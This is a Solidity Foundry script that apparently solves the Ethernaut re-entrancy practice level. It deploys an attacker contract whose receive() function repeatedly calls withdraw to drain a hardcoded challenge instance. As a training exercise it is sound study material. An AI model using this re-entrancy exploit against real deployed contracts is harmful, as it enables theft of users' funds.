// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.12;

import "forge-std/Script.sol";
import "../src/Ethernaut Challenge/10_Re-entrancy.sol";

contract ExploitScript is Script {

    function run() external {
        vm.startBroadcast();

        ReEntrancyAttacker attacker = new ReEntrancyAttacker{value: 0.001 ether}(0x8526F494A610C58D9668648787fEC9993Af6584F);
        attacker.attack();

        vm.stopBroadcast();
    }
}

contract ReEntrancyAttacker {

    Reentrance public level10;
    constructor(address payable _challengeInstance) public payable {
        level10 = Reentrance(_challengeInstance);
    }

    function attack() external {
        
        level10.donate{value: 0.001 ether}(address(this));
        level10.withdraw(0.001 ether);
    }

    receive() external payable{
        
        level10.withdraw(0.001 ether);
    }
}